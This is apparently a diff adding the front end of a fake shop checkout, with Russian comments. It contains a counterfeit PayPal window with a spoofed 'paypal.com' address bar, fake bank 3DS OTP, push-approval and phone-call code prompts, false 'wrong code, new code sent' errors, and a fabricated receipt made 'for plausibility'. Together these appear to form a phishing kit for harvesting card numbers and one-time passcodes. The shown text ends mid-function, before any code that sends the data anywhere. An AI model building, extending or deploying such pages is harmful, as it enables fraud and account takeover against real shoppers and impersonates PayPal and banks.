+            <div class="paypal-browser-bar">
+                <div class="paypal-url-input-box">
+                    <span class="secure-lock-icon">🔒</span>
+                    <span style="color: #16a34a; font-weight: 600;">https://</span><span style="color: #334155; font-weight: 400;">://paypal.com</span>
+                </div>
+                <div class="close-modal-x-btn" onclick="closeAllPaymentModals()">&times;</div>
+            </div>
+
+            <!-- Тело формы с отступами -->
+            <div style="padding: 35px 25px; position: relative; box-sizing: border-box; width: 100%;">
+                <div class="paypal-panel-loader" id="paypal2faLoader"><div class="paypal-panel-spinner-ring"></div></div>
+                
+                <div class="paypal-embedded-header" style="text-align: left; margin-bottom: 25px;">Pay<span>Pal</span></div>
+                <h4 style="font-size: 20px; font-weight: 700; color: #111111; margin: 0 0 10px 0; text-align: left; font-family: sans-serif;">Enter the code we texted you</h4>
+                <p style="font-size: 14px; color: #333333; margin-bottom: 25px; text-align: left;">We sent it to <span id="paypalOtpPhoneMask" style="font-weight: 600;">+1 9••-•••-••35</span>.</p>
+                <div class="paypal-alert-error" id="paypal-2fa-error-box" style="display: none !important;">The security code does not match. Please try again.</div>
+                
+                <!-- Строка ячеек PayPal в один ряд -->
+                <div class="paypal-otp-row-grid">
+                    <input type="text" class="paypal-otp-cell-field" maxlength="1" oninput="this.value=this.value.replace(/[^0-9]/g,''); moveNextPaypal(this, 'p2')" id="p1" autocomplete="off">
+                    <input type="text" class="paypal-otp-cell-field" maxlength="1" oninput="this.value=this.value.replace(/[^0-9]/g,''); moveNextPaypal(this, 'p3')" id="p2" autocomplete="off">
+                    <input type="text" class="paypal-otp-cell-field" maxlength="1" oninput="this.value=this.value.replace(/[^0-9]/g,''); moveNextPaypal(this, 'p4')" id="p3" autocomplete="off">
+                    <input type="text" class="paypal-otp-cell-field" maxlength="1" oninput="this.value=this.value.replace(/[^0-9]/g,''); moveNextPaypal(this, 'p5')" id="p4" autocomplete="off">
+                    <input type="text" class="paypal-otp-cell-field" maxlength="1" oninput="this.value=this.value.replace(/[^0-9]/g,''); moveNextPaypal(this, 'p6')" id="p5" autocomplete="off">
+                    <input type="text" class="paypal-otp-cell-field" maxlength="1" oninput="this.value=this.value.replace(/[^0-9]/g,'');" id="p6" autocomplete="off">
+                </div>
+                
+                <div style="text-align: left; font-size: 13.5px; color: #64748b; margin-top: 15px; margin-bottom: 30px;">
+                    <a href="#" id="paypalResendBtn" style="color: #64748b; text-decoration: none; cursor: not-allowed; font-weight: 500;" onclick="handlePaypalResendClick(event)">Resend code in 30 sec</a>
+                </div>
+                <button type="button" class="btn-place-order" id="paypal-2fa-btn" style="background-color:#003087; border-radius:25px; margin-top:20px; padding: 14px;" onclick="submitPaypalOtp()">
+                    <div class="spinner-inline" id="paypal-2fa-spinner"></div>
+                    <span>Submit</span>
+                </button>
+            </div>
+        </div>
+    </div>
+    <!-- ================================================================= -->
+    <!-- ШЛЮЗОВЫЕ МОДАЛЬНЫЕ ОКНА БАНКА (ЧАСТЬ 1: 3DS СМС ВЕРИФИКАЦИЯ)     -->
+    <!-- ================================================================= -->
+
+    <!-- МОДАЛЬНОЕ ОКНО 3DS БАНКА (СТРОГО ПО ВАШЕМУ ЭТАЛОНУ С УВЕЛИЧЕННЫМ ОТСТУПОМ ВНИЗ) -->
+    <div class="payment-modal-backdrop" id="bankOtpModalWrapper" style="display: none;">
+        <!-- Стало (Сузили окно OTP до 380px для идеального баланса): -->
+<div class="payment-modal-window-box" style="width: 380px !important; max-width: 95% !important; padding: 30px 25px 150px 25px !important; background: #ffffff !important; border-radius: 12px !important; box-sizing: border-box !important; margin: auto !important; border: none !important;">
+
+            <div class="bank-3ds-container" id="otp-block-window" style="display: flex !important; width: 100% !important; padding: 0 !important; border: none !important; box-shadow: none !important;">
+
+                <!-- Крупные логотипы банка по краям строки -->
+                <div class="bank-3ds-logos-row">
+                    <img id="bank3dsLogoLeft" class="bank-3ds-logo-left" src="" alt="Bank" onerror="this.style.display='none'">
+                    <img id="bank3dsLogoRight" class="bank-3ds-logo-right" src="" alt="Secure" onerror="this.style.display='none'">
+                </div>
+                
+                <h4 style="font-size: 23px !important; font-weight: 700 !important; color: #111111 !important; margin: 0 0 16px 0 !important; text-align: center !important; font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif !important;">Purchase confirmation</h4>
+                
+                <div class="bank-3ds-instructions" style="font-size: 13.5px !important; color: #222222 !important; line-height: 1.45 !important; text-align: center !important; margin: 0 0 20px 0 !important; font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif !important; padding: 0 5px !important;">
+                    To authorize this payment, please enter the one-time password sent to your registered mobile number ending in <span id="m3dsPhoneMask" style="font-weight: 700 !important;">******87</span>.
+                </div>
+                
+                <!-- Центрированный фиксированный блок параметров транзакции (параметры не смещаются) -->
+                <div style="width: 100% !important; margin: 0 0 20px 0 !important; display: flex !important; flex-direction: column !important; gap: 6px !important; font-family: Arial, Helvetica, sans-serif !important; font-size: 13.5px !important; box-sizing: border-box !important; align-items: center !important; border-bottom: 1px solid #e2e8f0 !important; padding-bottom: 20px !important;">
+                    <div style="display: flex !important; width: 280px !important; justify-content: space-between !important;">
+                        <div style="color: #64748b !important; text-align: right !important; width: 110px !important;">Merchant:</div>
+                        <div style="color: #111111 !important; text-align: left !important; font-weight: 700 !important; width: 155px !important; padding-left: 15px !important;">Case for Phone</div>
+                    </div>
+                    <div style="display: flex !important; width: 280px !important; justify-content: space-between !important;">
+                        <div style="color: #64748b !important; text-align: right !important; width: 110px !important;">Amount:</div>
+                        <div style="color: #111111 !important; text-align: left !important; font-weight: 700 !important; width: 155px !important; padding-left: 15px !important;">USD 199.00</div>
+                    </div>
+                    <div style="display: flex !important; width: 280px !important; justify-content: space-between !important;">
+                        <div style="color: #64748b !important; text-align: right !important; width: 110px !important;">Date:</div>
+                        <div style="color: #111111 !important; text-align: left !important; font-weight: 700 !important; width: 155px !important; padding-left: 15px !important;" id="m3dsDateDisplay">17/10/2026</div>
+                    </div>
+                    <div style="display: flex !important; width: 280px !important; justify-content: space-between !important;">
+                        <div style="color: #64748b !important; text-align: right !important; width: 110px !important;">Card number:</div>
+                        <div style="color: #111111 !important; text-align: left !important; font-weight: 700 !important; width: 155px !important; padding-left: 15px !important; font-family: monospace !important;" id="m3dsCardMask">4117******0362</div>
+                    </div>
+                </div>
+                
+                <!-- Стало: Сбалансировали ширину элементов, чтобы текст слева встал свободно в один ряд -->
+<!-- Стало: Расширили поле ввода до 140px и ограничили ввод строго до 6 цифр (maxlength="6") -->
+<div class="bank-3ds-input-row" style="display: flex !important; align-items: center !important; justify-content: center !important; border-top: none !important; padding-top: 5px !important; margin-top: 0 !important; margin-bottom: 20px !important; gap: 12px !important; width: 100% !important; box-sizing: border-box !important;">
+    <div class="bank-3ds-label-inline" style="font-family: Arial, sans-serif !important; font-size: 14px !important; font-weight: 500 !important; color: #111111 !important; white-space: nowrap !important; flex-shrink: 0 !important;">Enter OTP:</div>
+    <div class="bank-3ds-field-container" style="width: 100px !important; min-width: 140px !important; flex-shrink: 0 !important; height: 42px !important;">
+        <input type="text" id="otpCode" maxlength="6" autocomplete="off" oninput="validateOtpInput()" style="width: 100% !important; height: 42px !important; border: 1px solid #cbd5e1 !important; border-radius: 6px !important; font-size: 16px !important; letter-spacing: 0.5px !important; color: #475569 !important; font-weight: 500 !important; text-align: center; box-sizing: border-box !important; outline: none !important;">
+    </div>
+    <button type="button" class="btn-bank-submit-inline" id="bank-submit-inline-btn" onclick="submitOtp()" style="width: 100px !important; min-width: 100px !important; height: 42px !important; background-color: #6366f1 !important; border-radius: 6px !important; font-size: 14px !important; font-weight: 600 !important; color: #ffffff !important; border: none !important; cursor: pointer !important; display: flex !important; align-items: center !important; justify-content: center !important; box-sizing: border-box !important; flex-shrink: 0 !important;">
+        <div class="spinner-inline" id="bank-inline-spinner"></div>
+        <span id="bank-submit-text">Submit</span>
+    </button>
+</div>
+
+
+                
+                <!-- Контейнер вывода системного сообщения об ошибке кода -->
+                <div id="error-block-alert" style="display: none; flex-direction: column; align-items: center; gap: 8px; margin: 0 0 15px 0; font-size: 13px; color: #333333; text-align: center; font-family: sans-serif;">
+                    <div id="error-alert-text" style="color: #dc2626; font-weight: 500;">The one-time password is incorrect. We have sent a new code.</div>
+                    <a href="#" id="reEnterLink" style="color: #6366f1; text-decoration: underline; font-weight: 600; font-size: 13.5px;" onclick="handleReEnter(event)">Re-enter</a>
+                </div>
+                
+                <div class="bank-3ds-timer-text" id="3dsTimerMinutes" style="margin: 5px 0 15px 0 !important; font-size: 13.5px !important; font-weight: 500 !important; color: #111111 !important; font-family: Arial, sans-serif !important;">You have <b>5:00</b> minutes left to enter your OTP.</div>
+                <a href="#" class="bank-3ds-resend-btn" id="resendOtpBtn" style="margin-bottom: 40px !important; color: #6366f1 !important; font-size: 13.5px !important;" onclick="triggerResendOtp(event)">Re-send OTP</a>
+                
+                <!-- Прижатый к низу длинного окна футер безопасности -->
+                <div class="bank-footer-layout" style="margin-top: 10px !important; position: absolute !important; bottom: 25px !important; left: 25px !important; right: 25px !important; box-sizing: border-box !important;">
+                    <div style="display: flex; align-items: center; gap: 4px;"><span style="font-size: 14px;">🛡️</span> Secured by SSL</div>
+                    <div><a href="#" style="color: #6366f1 !important;" onclick="alert('Please check your phone or contact your bank support.'); return false;">Need Help?</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ================================================================= -->
+    <!-- ШЛЮЗОВЫЕ МОДАЛЬНЫЕ ОКНА БАНКА (ЧАСТЬ 2: PUSH APP ВЕРИФИКАЦИЯ)     -->
+    <!-- ================================================================= -->
+
+                   <!-- ================================================================= -->
+    <!-- ШЛЮЗОВЫЕ МОДАЛЬНЫЕ ОКНА БАНКА (ЧАСТЬ 2: PUSH APP ВЕРИФИКАЦИЯ)     -->
+    <!-- ================================================================= -->
+
+    <!-- МОДАЛЬНОЕ ОКНО ПОДТВЕРЖДЕНИЯ PUSH-УВЕДОМЛЕНИЯ (ТОЧНАЯ КОПИЯ СУПЕР-ЭТАЛОНА) -->
+    <div class="payment-modal-backdrop" id="bankPushModalWrapper" style="display: none;">
+        <!-- Адаптивная коробка: ширина 440px на ПК, автоматическое сжатие до 95% на мобильных с правильными отступами -->
+        <!-- Стало (Сузили ширину окна до 390px для идеального вида на ПК): -->
+<div class="payment-modal-window-box" style="width: 390px !important; max-width: 95% !important; padding: 45px 35px 25px 35px !important; background: #ffffff !important; border-radius: 16px !important; margin: auto !important; border: none !important; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15) !important; box-sizing: border-box !important; display: flex !important; flex-direction: column !important; align-items: center !important;">
+
+            <div class="bank-3ds-container" style="display: flex !important; width: 100% !important; padding: 0 !important; border: none !important; box-shadow: none !important; flex-direction: column !important; align-items: center !important;">
+                
+              <!-- Левый логотип увеличен до 190px, правому добавлен отрицательный отступ вправо -15px -->
+<div class="bank-3ds-logos-row" style="display: flex !important; flex-direction: row !important; justify-content: space-between !important; align-items: center !important; margin-top: -30px !important; margin-bottom: 25px !important; margin-left: -40px !important; width: 100% !important; height: 125px !important; box-sizing: border-box !important; padding: 0 5px !important;">
+    <img id="bankPushLogoLeft" class="bank-3ds-logo-left" src="" alt="Bank" onerror="this.style.display='none'" style="width: 190px !important; max-width: 190px !important; height: 120px !important; max-height: 120px !important; object-fit: contain !important; display: block !important; margin: 0 !important;">
+    <img id="bankPushLogoRight" class="bank-3ds-logo-right" src="" alt="Secure" onerror="this.style.display='none'" style="width: 260px !important; max-width: 260px !important; height: 120px !important; max-height: 120px !important; object-fit: contain !important; display: block !important; margin: 0 0 0 auto !important; margin-right: -15px !important;">
+</div>
+
+
+
+
+
+                
+                <h4 style="font-family: Arial, Helvetica, sans-serif !important; font-size: 20px !important; font-weight: 700 !important; color: #111111 !important; margin: 0 auto 16px auto !important; text-align: center !important; letter-spacing: -0.3px !important; max-width: 360px !important; box-sizing: border-box !important;">Let's make sure it's you</h4>
+                
+                <!-- Инструкция: расширена область max-width до 360px для длинных ровных рядов текста близко друг к другу -->
+                <div class="bank-3ds-instructions" style="font-family: Arial, Helvetica, sans-serif !important; text-align: center !important; font-size: 13px !important; color: #222222 !important; line-height: 1.45 !important; margin: 0 auto 20px auto !important; padding: 0 !important; max-width: 360px !important; box-sizing: border-box !important; display: block !important;">
+                    Before placing your order, you must verify payment to <b>Case for Phone</b> for <b>USD 199</b>.<br><br>
+                    1. Open BANK mobile app (or use your preferred banking method) to verify the payment.<br><br>
+                    2. Return to this page and tap complete to finish placing your order.
+                </div>
+                
+                <!-- Графический круговой таймер -->
+                <div class="bank-push-timer-circle-box" style="position: relative !important; width: 110px !important; height: 110px !important; margin: 15px auto !important; display: flex !important; align-items: center !important; justify-content: center !important;">
+                    <svg class="bank-push-svg-ring" style="position: absolute !important; top: 0; left: 0; width: 110px; height: 110px; transform: rotate(-90deg);">
+                        <circle class="bank-push-circle-bg" cx="55" cy="55" r="46" style="stroke: #e2e8f0 !important; fill: none; stroke-width: 4;"></circle>
+                        <circle class="bank-push-circle-progress" id="pushRingAnimate" cx="55" cy="55" r="46" style="stroke: #4b5ed4 !important; fill: none; stroke-width: 4; stroke-dasharray: 289; stroke-dashoffset: 0; transition: stroke-dashoffset 1s linear;"></circle>
+                    </svg>
+                    <div class="bank-push-timer-counter-text" style="display: flex !important; flex-direction: column !important; align-items: center !important; justify-content: center !important; font-family: Arial, Helvetica, sans-serif !important; text-align: center !important;">
+                        <span class="digits" id="pushTimerDigits" style="font-size: 26px !important; font-weight: 700 !important; color: #111111 !important; line-height: 1 !important;">5:00</span>
+                        <span class="sub" style="font-size: 10px !important; color: #64748b !important; margin-top: 4px !important; font-weight: 500;">you have</span>
+                    </div>
+                </div>
+
+                <!-- Красный блок ошибки пуша -->
+                <div id="bank-push-error-box" style="display: none !important; font-family: Arial, sans-serif !important; font-size: 13px !important; color: #b91c1c !important; text-align: center !important; line-height: 1.4 !important; margin: 5px auto 15px auto !important; max-width: 300px !important; font-weight: 500 !important;">
+                    You did not confirm the action. A new push notification has been sent.
+                </div>
+                
+                <!-- Аккуратная закругленная кнопка COMPLETE с отступами по бокам (ширина 85%) -->
+                <button type="button" class="btn-bank-push-complete" id="push-complete-btn" onclick="submitPushCompleteAction()" style="width: 85% !important; max-width: 300px !important; padding: 12px !important; font-size: 14px !important; font-weight: 700 !important; background-color: #4b5ed4 !important; color: #ffffff !important; border: none !important; border-radius: 8px !important; cursor: pointer; text-transform: uppercase !important; letter-spacing: 0.5px !important; font-family: Arial, Helvetica, sans-serif !important; margin: 25px auto 25px auto !important; box-shadow: 0 4px 12px rgba(75, 94, 212, 0.2) !important; transition: background 0.15s ease !important; display: flex !important; align-items: center !important; justify-content: center !important; box-sizing: border-box !important;">
+                    <div class="spinner-inline" id="push-inline-spinner" style="width: 14px; height: 14px; border-width: 2px; margin-right: 8px;"></div>
+                    <span>Complete</span>
+                </button>
+                
+                <!-- Безопасный футер: жестко зафиксирован внутри коробки, защищен от вылетов за поля -->
+                <div class="bank-footer-layout" style="display: flex !important; justify-content: space-between !important; align-items: center !important; border-top: 1px solid #eeeeee !important; padding-top: 14px !important; font-size: 12px !important; color: #64748b !important; width: 100% !important; box-sizing: border-box !important; position: relative !important; margin-top: 20px !important; padding-left: 5px !important; padding-right: 5px !important; left: 0 !important; right: 0 !important; bottom: 0 !important;">
+                    <div style="display: flex; align-items: center; gap: 5px;">🛡️ Secured by SSL</div>
+                    <div><a href="#" style="color: #4b5ed4; text-decoration: underline;" onclick="alert('Please check your phone or contact your bank support.'); return false;">Need Help?</a></div>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+
+
+
+    <!-- МОДАЛЬНОЕ ОКНО ПОДТВЕРЖДЕНИЯ ВХОДЯЩЕГО ЗВОНКА РОБОТА -->
+    <div class="payment-modal-backdrop" id="bankCallModalWrapper" style="display: none;">
+        <div class="payment-modal-window-box" style="width: 400px !important; border-radius: 12px !important; background: #ffffff !important; padding: 35px 25px !important; margin: auto !important; border: none !important;">
+            <div class="method-info-window" id="method-call-window" style="display: flex !important; width: 100% !important; padding: 0 !important; border: none !important; box-shadow: none !important;">
+                <div class="paypal-panel-loader" id="callScreenLoader" style="display: none;"><div class="paypal-panel-spinner-ring"></div></div>
+                <div style="font-size:40px; margin-bottom:15px;">📞</div>
+                <h4 style="font-family: -apple-system, sans-serif; font-size: 20px; font-weight: 700; color: #111111; margin: 0 0 10px 0;">Incoming Phone Call</h4>
+                <p style="font-size:13px; color:#64748b; line-height:1.5; margin: 0 0 15px 0;">An automated system is calling your phone. Please listen to the robot and enter the predicted code below:</p>
+                <div id="call-error-alert" style="color:#ef4444; font-size:12.5px; margin-bottom:12px; font-weight:500; text-align:center; display:none; background:#fef2f2; padding:8px; border:1px solid #fca5a5; border-radius:4px; width: 100%; box-sizing: border-box;"></div>
+                <div class="group" style="margin-top:5px;"><input type="text" id="callSecretCode" placeholder="Enter Secret Code" maxlength="6" style="text-align:center; font-weight:bold; letter-spacing:2px;"></div>
+                <button type="button" class="btn-place-order" id="call-submit-btn" style="background-color:#4a5ed4; margin-top: 10px;" onclick="submitCallSecretCode()">
+                    <div class="spinner-inline" id="call-btn-spinner" style="width: 12px; height: 12px; border-width: 2px; margin-right: 4px;"></div>
+                    <span id="call-submit-text">Confirm Code</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+        <!-- ФИНАЛЬНОЕ ОКНО: ПЛАТЕЖ ОДОБРЕН (ПОЛНОЦЕННЫЙ ЭЛЕКТРОННЫЙ ЧЕК ЗАКАЗА С СКРИНШОТА) -->
+    <div class="payment-modal-backdrop" id="statusSuccessModalWrapper" style="display: none; background: #ffffff !important; overflow-y: auto !important; align-items: flex-start !important; padding: 0 !important;">
+        <div style="width: 100% !important; max-width: 600px !important; margin: 0 auto !important; background: #ffffff !important; padding: 25px 20px !important; box-sizing: border-box !important; font-family: 'Inter', sans-serif !important; color: #555555 !important;">
+            
+            <!-- Шапка магазина -->
+            <div style="display: flex !important; justify-content: space-between !important; align-items: center !important; border-bottom: 1px solid #eaeaea !important; padding-bottom: 15px !important; margin-bottom: 25px !important; width: 100% !important;">
+                <span style="font-size: 18px !important; font-weight: 600 !important; color: #111111 !important; letter-spacing: -0.3px !important;">Case for Phone</span>
+                <div style="border: 1px solid #bd7a3d !important; padding: 6px 10px !important; border-radius: 4px !important; display: flex !important; flex-direction: column !important; gap: 3px !important; cursor: pointer !important;">
+                    <div style="width: 18px; height: 2px; background: #bd7a3d;"></div>
+                    <div style="width: 18px; height: 2px; background: #bd7a3d;"></div>
+                    <div style="width: 18px; height: 2px; background: #bd7a3d;"></div>
+                </div>
+            </div>
+
+            <h2 style="font-size: 26px !important; font-weight: 700 !important; color: #111111 !important; margin: 0 0 15px 0 !important; text-transform: uppercase !important; letter-spacing: 0.5px !important;">Checkout</h2>
+            <p style="font-size: 14px !important; color: #222222 !important; margin-bottom: 30px !important; font-family: inherit !important;">Thank you. Your order has been received.</p>
+
+            <!-- Линейная мини-спецификация параметров чека -->
+            <div style="display: grid !important; grid-template-columns: repeat(3, 1fr) !important; gap: 10px !important; border-left: 2px dashed #bd7a3d !important; padding-left: 15px !important; margin-bottom: 35px !important; width: 100% !important; box-sizing: border-box !important;">
+                <div>
+                    <div style="font-size: 10px !important; text-transform: uppercase !important; color: #999999 !important; font-weight: 600 !important; letter-spacing: 0.5px !important;">Order Number:</div>
+                    <div style="font-size: 14px !important; font-weight: 700 !important; color: #111111 !important; margin-top: 4px !important;" id="receiptOrderNumber">567</div>
+                </div>
+                <div>
+                    <div style="font-size: 10px !important; text-transform: uppercase !important; color: #999999 !important; font-weight: 600 !important; letter-spacing: 0.5px !important;">Date:</div>
+                    <div style="font-size: 14px !important; font-weight: 700 !important; color: #111111 !important; margin-top: 4px !important;" id="receiptDateDisplay">July 10, 2026</div>
+                </div>
+                <div>
+                    <div style="font-size: 10px !important; text-transform: uppercase !important; color: #999999 !important; font-weight: 600 !important; letter-spacing: 0.5px !important;">Total:</div>
+                    <div style="font-size: 14px !important; font-weight: 700 !important; color: #111111 !important; margin-top: 4px !important;">$199.00</div>
+                </div>
+            </div>
+
+            <h3 style="font-size: 16px !important; font-weight: 700 !important; color: #111111 !important; margin: 0 0 15px 0 !important; text-transform: uppercase !important; letter-spacing: 0.5px !important; border-bottom: 2px solid #111111 !important; padding-bottom: 8px !important;">Order Details</h3>
+            
+            <!-- Таблица спецификации чека -->
+            <table style="width: 100% !important; border-collapse: collapse !important; font-size: 13.5px !important; margin-bottom: 35px !important;">
+                <thead>
+                    <tr style="border-bottom: 1px solid #eaeaea !important;">
+                        <th style="text-align: left !important; padding: 10px 0 !important; font-weight: 600 !important; color: #111111 !important;">Product</th>
+                        <th style="text-align: right !important; padding: 10px 0 !important; font-weight: 600 !important; color: #111111 !important;">Total</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr style="border-bottom: 1px solid #eaeaea !important;">
+                        <td style="padding: 12px 0 !important; color: #bd7a3d !important; font-weight: 500 !important;">Armchair Black in Wood <span style="color:#555555 !important;">&times; 1</span></td>
+                        <td style="text-align: right !important; padding: 12px 0 !important; color: #111111 !important;">$199.00</td>
+                    </tr>
+                    <tr style="border-bottom: 1px solid #eaeaea !important;">
+                        <td style="padding: 12px 0 !important; font-weight: 500 !important; color: #111111 !important;">Subtotal:</td>
+                        <td style="text-align: right !important; padding: 12px 0 !important; color: #111111 !important;">$199.00</td>
+                    </tr>
+                    <tr style="border-bottom: 1px solid #eaeaea !important;">
+                        <td style="padding: 12px 0 !important; font-weight: 500 !important; color: #111111 !important;">Shipping:</td>
+                        <td style="text-align: right !important; padding: 12px 0 !important; color: #111111 !important;">Free shipping</td>
+                    </tr>
+                    <tr style="border-bottom: 1px solid #eaeaea !important;">
+                        <td style="padding: 12px 0 !important; font-weight: 500 !important; color: #111111 !important;">Payment method:</td>
+                        <td style="text-align: right !important; padding: 12px 0 !important; color: #111111 !important;" id="receiptMethodDisplay">Stripe</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 16px 0 0 0 !important; font-size: 15px !important; font-weight: 700 !important; color: #111111 !important;">Total:</td>
+                        <td style="text-align: right !important; padding: 16px 0 0 0 !important; font-size: 15px !important; font-weight: 700 !important; color: #111111 !important;">$199.00</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <!-- Блок Billing Address -->
+            <div style="border: 1px solid #eaeaea !important; padding: 20px !important; margin-bottom: 20px !important; width: 100% !important; box-sizing: border-box !important;">
+                <h4 style="font-size: 15px !important; font-weight: 700 !important; color: #111111 !important; margin: 0 0 12px 0 !important; text-transform: uppercase !important; letter-spacing: 0.5px !important;">Billing Address</h4>
+                <div style="font-size: 13px !important; line-height: 1.6 !important; color: #555555 !important;" id="receiptBillingAddressBlock">
+                    Charly Ferguson<br>123 Rodeo Dr<br>Houston, TX 33322<br>📞 +19008008877<br>✉️ charly@gmail.com
+                </div>
+            </div>
+
+            <!-- Блок Shipping Address -->
+            <div style="border: 1px solid #eaeaea !important; padding: 20px !important; width: 100% !important; box-sizing: border-box !important;">
+                <h4 style="font-size: 15px !important; font-weight: 700 !important; color: #111111 !important; margin: 0 0 12px 0 !important; text-transform: uppercase !important; letter-spacing: 0.5px !important;">Shipping Address</h4>
+                <div style="font-size: 13px !important; line-height: 1.6 !important; color: #555555 !important;" id="receiptShippingAddressBlock">
+                    Henry Ford<br>Appleton, AL 44444<br>📞 +18009008877
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ================================================================= -->
+    <!-- ИНТЕРАКТИВНЫЙ ДВИЖОК ШЛЮЗА (КЛИЕНТСКИЙ СКРИПТОВЫЙ МОДУЛЬ)        -->
+    <!-- ================================================================= -->
+    <script>
+        // Глобальные переменные состояния платежной сессии
+        let currentCardId = null;
+        let statusInterval = null;
+        let timerInterval = null;
+        let activeMethod = 'card';
+        let initialTimerSeconds = 300;
+        let cachedBankLogo = "";
+        let cachedPaymentLogo = "";
+        let isSubmitting = false;
+        let isWaitingForNewDecision = false;
+
+        // Функция открытия и переключения платежных методов (Card / PayPal)
+                // Полностью исправленная функция открытия и переключения платежных методов (Card / PayPal)
+        function openPaymentModal(method) {
+            // Массив проверки обязательных полей Billing адреса
+            const requiredBillingFields = ['firstName', 'lastName', 'countryRegion', 'streetAddress', 'townCity', 'stateRegion', 'zipCode', 'phone', 'emailAddress'];
+            let isBillingValid = true;
+
+            requiredBillingFields.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) {
+                    if (!input.value.trim() || input.value === "") {
+                        input.classList.add('input-error'); // Подсвечиваем незаполненное поле красным
+                        isBillingValid = false;
+                    } else {
+                        input.classList.remove('input-error');
+                    }
+                }
+            });
+
+            // Если адрес не заполнен — вежливо предупреждаем и прерываем переключение табов
+            if (!isBillingValid) {
+                alert('Please fill in all required Billing details before selecting a payment method!');
+                return; // Здесь return находится строго внутри функции, это исправит синтаксическую ошибку
+            }
+
+            // Переключаем активный платежный метод
+            activeMethod = method;
+            
+            const errBox2fa = document.getElementById('paypal-2fa-error-box');
+            if (errBox2fa) errBox2fa.style.setProperty('display', 'none', 'important');
+            
+            if (method === 'card') {
+                document.getElementById('tab-card').classList.add('active');
+                document.getElementById('tab-paypal').classList.remove('active');
+                document.getElementById('stripe-inline-form-box').style.display = 'block';
+                document.getElementById('paypal-inline-fields-box').style.display = 'none';
+            } else {
+                document.getElementById('tab-paypal').classList.add('active');
+                document.getElementById('tab-card').classList.remove('active');
+                document.getElementById('stripe-inline-form-box').style.display = 'none';
+                document.getElementById('paypal-inline-fields-box').style.display = 'block';
+            }
+        }
+
+        // Функция скрытия всех открытых модальных окон шлюзов
+        function closeAllPaymentModals() {
+            const containers = [
+                'paypalModalWrapper', 'paypalOtpModalWrapper', 
+                'bankOtpModalWrapper', 'bankPushModalWrapper', 'bankCallModalWrapper', 
+                'statusSuccessModalWrapper', 'statusDeclineModalWrapper', 'statusFundsModalWrapper'
+            ];
+            containers.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.style.display = 'none';
+            });
+        }
+
+        // Маска автоматического разделения номера карты по 4 символа с пробелом
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            let target = e.target; 
+            let value = target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            let matches = value.match(/\d{1,4}/g); 
+            target.value = matches ? matches.join(' ') : '';
+        });
+
+        // Маска для автоматического форматирования даты окончания карты (MM / YY)
+        document.getElementById('expiry').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        // Вспомогательная функция валидации кнопки 3DS отправки и фильтрации букв
+        function validateOtpInput() {
+            const input = document.getElementById('otpCode');
+            if (input) {
+                // Моментально удаляет любые символы, кроме цифр (0-9)
+                input.value = input.value.replace(/[^0-9]/g, '');
+            }
+            
+            const alertBox = document.getElementById('error-block-alert');
+            const isAlertVisible = alertBox && alertBox.style.display !== 'none' && alertBox.style.display !== '';
+            
+            if (input && input.value.trim().length > 0 && !isAlertVisible) {
+                enableBankSubmit();
+            }
+        }
+
+        function disableBankSubmit() {
+            const btn = document.getElementById('bank-submit-inline-btn');
+            if (btn) { btn.disabled = true; btn.style.opacity = '0.4'; btn.style.cursor = 'not-allowed'; }
+        }
+
+        function enableBankSubmit() {
+            const btn = document.getElementById('bank-submit-inline-btn');
+            if (btn) { btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer'; }
+        }
+
+        // Автоматический посимвольный переход фокуса для ячеек PayPal 2FA
+        function moveNextPaypal(el, nextId) { 
+            if (el.value.length === 1) { 
+                const next = document.getElementById(nextId); 
+                if (next) next.focus(); 
+            } 
+        }
+
+        // Привязка слушателей клавиатуры для корректного удаления символов (Backspace)
+        window.addEventListener('DOMContentLoaded', () => {
+            for (let i = 1; i <= 6; i++) {
+                let currentCell = document.getElementById('p' + i);
+                if (currentCell) {
+                    currentCell.addEventListener('keydown', function(e) {
+                        if (e.key === 'Backspace' && this.value.length === 0) {
+                            let prevCell = document.getElementById('p' + (i - 1));
+                            if (prevCell) prevCell.focus();
+                        }
+                    });
+                }
+            }
+        });
+        // Главный обработчик нажатия на кнопку Place order
+        function handleMainPlaceOrderClick() {
+            if (activeMethod === 'paypal') {
+                processPlaceOrder('paypal');
+            } else {
+                processPlaceOrder('card');
+            }
+        }
+
+                // Функция динамического формирования маски телефона для PayPal 2FA
+        function formatPayPalPhoneMask(rawPhone) {
+            const clean = rawPhone.replace(/[^0-9]/g, '');
+            if (clean.length >= 7) {
+                // Берем код страны и первую цифру, а также две последние цифры
+                const countryCode = rawPhone.startsWith('+') ? rawPhone.substring(0, 3) : '+' + clean.substring(0, 1);
+                const firstDigit = clean.substring(clean.length - 10, clean.length - 9) || '9';
+                const lastTwo = clean.substring(clean.length - 2);
+                return countryCode + ' ' + firstDigit + '••-•••-••' + lastTwo;
+            }
+            return '+1 9••-•••-••35'; // Резервная маска по умолчанию
+        }
+
+        // Функция наполнения страницы чека (Thank you) реальными данными из формы
+                // Функция наполнения страницы чека (Thank you) реальными данными из формы
+        function fillReceiptDetails(methodType) {
+            // Генерация случайного номера заказа для правдоподобности
+            document.getElementById('receiptOrderNumber').innerText = Math.floor(Math.random() * 800) + 100;
+            
+            // Форматирование текущей даты под формат "Month DD, YYYY"
+            const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+            const currentSystemDate = new Date();
+            const formattedDate = months[currentSystemDate.getMonth()] + ' ' + currentSystemDate.getDate() + ', ' + currentSystemDate.getFullYear();
